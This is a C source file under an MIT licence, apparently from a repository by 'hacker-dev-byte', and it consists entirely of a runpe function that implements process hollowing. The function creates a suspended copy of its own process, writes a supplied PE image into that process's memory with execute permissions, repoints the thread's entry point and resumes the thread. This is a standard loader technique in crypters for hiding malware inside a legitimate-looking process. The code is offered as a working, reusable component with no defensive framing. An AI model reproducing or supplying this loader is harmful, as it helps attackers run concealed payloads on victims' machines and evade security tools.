/*
MIT License

Copyright (c) 2024 hacker-dev-byte

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all
copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
SOFTWARE.
*/

#include <windows.h>

VOID runpe(LPVOID image)
{
	PIMAGE_DOS_HEADER imgDosHeader = (PIMAGE_DOS_HEADER)(image);
	PIMAGE_NT_HEADERS imgNtHeader = (PIMAGE_NT_HEADERS)((DWORD_PTR)imgDosHeader + imgDosHeader->e_lfanew);

	PROCESS_INFORMATION PI;
	STARTUPINFOW SI;
	LPCONTEXT CTX;

	ZeroMemory(&PI, sizeof(PI));
	ZeroMemory(&SI, sizeof(SI));
	ZeroMemory(&CTX, sizeof(CTX));

	WCHAR fileName[MAX_PATH];

	GetModuleFileNameW(0, fileName, MAX_PATH);

	if (CreateProcessW(fileName, NULL, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &SI, &PI))
	{
		CTX = (LPCONTEXT)(VirtualAlloc(NULL, sizeof(CTX), MEM_COMMIT, PAGE_READWRITE));
		CTX->ContextFlags = CONTEXT_FULL;

		if (GetThreadContext(PI.hThread, (LPCONTEXT)CTX))
		{
			LPVOID imageBase = VirtualAllocEx(PI.hProcess, (LPVOID)(imgNtHeader->OptionalHeader.ImageBase), imgNtHeader->OptionalHeader.SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

			WriteProcessMemory(PI.hProcess, imageBase, image, imgNtHeader->OptionalHeader.SizeOfHeaders, NULL);

			for (INT section = 0; section < imgNtHeader->FileHeader.NumberOfSections; section++)
			{
				PIMAGE_SECTION_HEADER imgSectionHeader = (PIMAGE_SECTION_HEADER)((DWORD_PTR)image + imgDosHeader->e_lfanew + sizeof(IMAGE_NT_HEADERS) + sizeof(IMAGE_SECTION_HEADER) * section);

				WriteProcessMemory(PI.hProcess, (LPVOID)((DWORD_PTR)imageBase + imgSectionHeader->VirtualAddress), (LPVOID)((DWORD_PTR)image + imgSectionHeader->PointerToRawData), imgSectionHeader->SizeOfRawData, NULL);
			}

#ifdef _WIN64
			WriteProcessMemory(PI.hProcess, (LPVOID)(CTX->Rdx + sizeof(LPVOID) * 2), (LPVOID)(&imgNtHeader->OptionalHeader.ImageBase), sizeof(LPVOID), NULL);
#else
			WriteProcessMemory(PI.hProcess, (LPVOID)(CTX->Ebx + sizeof(LPVOID) * 2), (LPVOID)(&imgNtHeader->OptionalHeader.ImageBase), sizeof(LPVOID), NULL);
#endif // _WIN64

#ifdef _WIN64
			CTX->Rcx = (DWORD_PTR)imageBase + imgNtHeader->OptionalHeader.AddressOfEntryPoint;
#else
			CTX->Eax = (DWORD_PTR)imageBase + imgNtHeader->OptionalHeader.AddressOfEntryPoint;
#endif // _WIN64

			SetThreadContext(PI.hThread, (LPCONTEXT)CTX);
			ResumeThread(PI.hThread);
		}
	}
}